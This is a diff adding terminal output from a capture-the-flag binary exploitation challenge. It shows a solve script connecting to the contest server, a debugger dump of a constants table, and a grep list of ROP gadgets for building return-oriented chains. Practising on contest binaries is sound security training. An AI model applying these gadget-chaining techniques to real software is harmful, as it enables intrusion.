@@ -1,0 +1,80 @@
+mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Quick_Mafs$ python3 solve.py 
+[+] Opening connection to tamuctf.com on port 443: Done
+[DEBUG] Received 0x5b4 bytes:
+    b'call print() with rax = 0x5318\n'
+
+
+gdb-peda$ x/80gx 0x404000
+0x404000 <constants>:	0x660537e45fdcde9e	0xbcaf0d1adcedcbca
+0x404010 <constants+16>:	0xc7cd4e2c5442141f	0xe4c2d021cc6f9a3b
+0x404020 <constants+32>:	0x0e2f4e6ff09994e4	0x8267073f9d329ecc
+0x404030 <constants+48>:	0xbd8d1fda4f34ca85	0x3c6838799b303a69
+0x404040 <constants+64>:	0x4f1979957a875d09	0x521e3891b8178413
+0x404050 <constants+80>:	0x4e3cc1a6f14d79e3	0x40d3e737ee770d2e
+0x404060 <constants+96>:	0x3d2ef004e326e9c9	0x2a7517303f656a16
+0x404070 <constants+112>:	0x1e1dc70d26280744	0x2b92e3bd695723cd
+0x404080 <constants+128>:	0xfd2d5e3ed0a22180	0x38e2ce27a674119e
+0x404090 <constants+144>:	0x8f00c504553e15ff	0x1ed516bf7b80fda4
+0x4040a0 <constants+160>:	0x81751f8b6d3dfa0a	0x834cde37d3eb89e7
+0x4040b0 <constants+176>:	0x697a2a1a59e30c01	0x9ab657117c797264
+0x4040c0 <constants+192>:	0xc21e83450e2e5dd6	0x1992eb96ef48b0af
+0x4040d0 <constants+208>:	0x936adbbe8dbcdece	0xe7b81def89e607a7
+0x4040e0 <constants+224>:	0xad2594caf8622dd0	0xabe969ec979fb298
+0x4040f0 <constants+240>:	0xc90a95e41574fd74	0x38f673646c61747a
+0x404100 <constants+256>:	0x4a5d14eb1d9871be	0xff72542aa17e2822
+0x404110 <constants+272>:	0x4072af5cafa92747	0xc51d8fa2a829a5ec
+0x404120 <constants+288>:	0xadf5ddfa037a2936	0x6d26fa869de65c02
+0x404130 <constants+304>:	0x493c494f9746bc28	0xff3691f15bcdac99
+0x404140:	0x654428203a434347	0x332e38206e616962
+0x404150:	0x2e382029362d302e	0x0000000000302e33
+0x404160:	0x0000000000000000	0x0000000000000000
+
+mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Quick_Mafs$ grep "add ax" rop04.txt | grep "lea rbx" 
+0x0000000000401090: lea rbx, [0x404016]; add ax, word ptr [rbx]; ret; 
+0x00000000004010b4: lea rbx, [0x40401c]; add ax, word ptr [rbx]; ret; 
+0x00000000004010fc: lea rbx, [0x404028]; add ax, word ptr [rbx]; ret; 
+0x0000000000401120: lea rbx, [0x40402e]; add ax, word ptr [rbx]; ret; 
+0x000000000040112c: lea rbx, [0x404030]; add ax, word ptr [rbx]; ret; 
+0x000000000040115c: lea rbx, [0x404038]; add ax, word ptr [rbx]; ret; 
+0x0000000000401180: lea rbx, [0x40403e]; add ax, word ptr [rbx]; ret; 
+0x00000000004011a4: lea rbx, [0x404044]; add ax, word ptr [rbx]; ret; 
+0x00000000004011c8: lea rbx, [0x40404a]; add ax, word ptr [rbx]; ret; 
+0x00000000004011d4: lea rbx, [0x40404c]; add ax, word ptr [rbx]; ret; 
+0x00000000004011ec: lea rbx, [0x404050]; add ax, word ptr [rbx]; ret; 
+0x0000000000401210: lea rbx, [0x404056]; add ax, word ptr [rbx]; ret; 
+0x000000000040121c: lea rbx, [0x404058]; add ax, word ptr [rbx]; ret; 
+0x0000000000401234: lea rbx, [0x40405c]; add ax, word ptr [rbx]; ret; 
+0x0000000000401240: lea rbx, [0x40405e]; add ax, word ptr [rbx]; ret; 
+0x000000000040124c: lea rbx, [0x404060]; add ax, word ptr [rbx]; ret; 
+0x00000000004012a0: lea rbx, [0x40406e]; add ax, word ptr [rbx]; ret; 
+0x00000000004012c4: lea rbx, [0x404074]; add ax, word ptr [rbx]; ret; 
+0x0000000000401300: lea rbx, [0x40407e]; add ax, word ptr [rbx]; ret; 
+0x000000000040130c: lea rbx, [0x404080]; add ax, word ptr [rbx]; ret; 
+0x0000000000401330: lea rbx, [0x404086]; add ax, word ptr [rbx]; ret; 
+0x0000000000401360: lea rbx, [0x40408e]; add ax, word ptr [rbx]; ret; 
+0x00000000004013b4: lea rbx, [0x40409c]; add ax, word ptr [rbx]; ret; 
+0x00000000004013c0: lea rbx, [0x40409e]; add ax, word ptr [rbx]; ret; 
+0x0000000000401438: lea rbx, [0x4040b2]; add ax, word ptr [rbx]; ret; 
+0x00000000004014a4: lea rbx, [0x4040c4]; add ax, word ptr [rbx]; ret; 
+0x00000000004014d4: lea rbx, [0x4040cc]; add ax, word ptr [rbx]; ret; 
+0x00000000004014e0: lea rbx, [0x4040ce]; add ax, word ptr [rbx]; ret; 
+0x000000000040151c: lea rbx, [0x4040d8]; add ax, word ptr [rbx]; ret; 
+0x0000000000401534: lea rbx, [0x4040dc]; add ax, word ptr [rbx]; ret; 
+0x0000000000401558: lea rbx, [0x4040e2]; add ax, word ptr [rbx]; ret; 
+0x0000000000401570: lea rbx, [0x4040e6]; add ax, word ptr [rbx]; ret; 
+0x000000000040157c: lea rbx, [0x4040e8]; add ax, word ptr [rbx]; ret; 
+0x0000000000401588: lea rbx, [0x4040ea]; add ax, word ptr [rbx]; ret; 
+0x00000000004015c4: lea rbx, [0x4040f4]; add ax, word ptr [rbx]; ret; 
+0x00000000004015e8: lea rbx, [0x4040fa]; add ax, word ptr [rbx]; ret; 
+0x00000000004015f4: lea rbx, [0x4040fc]; add ax, word ptr [rbx]; ret; 
+0x0000000000401624: lea rbx, [0x404104]; add ax, word ptr [rbx]; ret; 
+0x000000000040163c: lea rbx, [0x404108]; add ax, word ptr [rbx]; ret; 
+0x0000000000401654: lea rbx, [0x40410c]; add ax, word ptr [rbx]; ret; 
+0x0000000000401660: lea rbx, [0x40410e]; add ax, word ptr [rbx]; ret; 
+0x00000000004016a8: lea rbx, [0x40411a]; add ax, word ptr [rbx]; ret; 
+0x00000000004016cc: lea rbx, [0x404120]; add ax, word ptr [rbx]; ret; 
+0x0000000000401738: lea rbx, [0x404132]; add ax, word ptr [rbx]; ret; 
+0x0000000000401750: lea rbx, [0x404136]; add ax, word ptr [rbx]; ret; 
+0x0000000000401768: lea rbx, [0x40413a]; add ax, word ptr [rbx]; ret; 
+
+    b'call print() with rax = 0x9778\n'
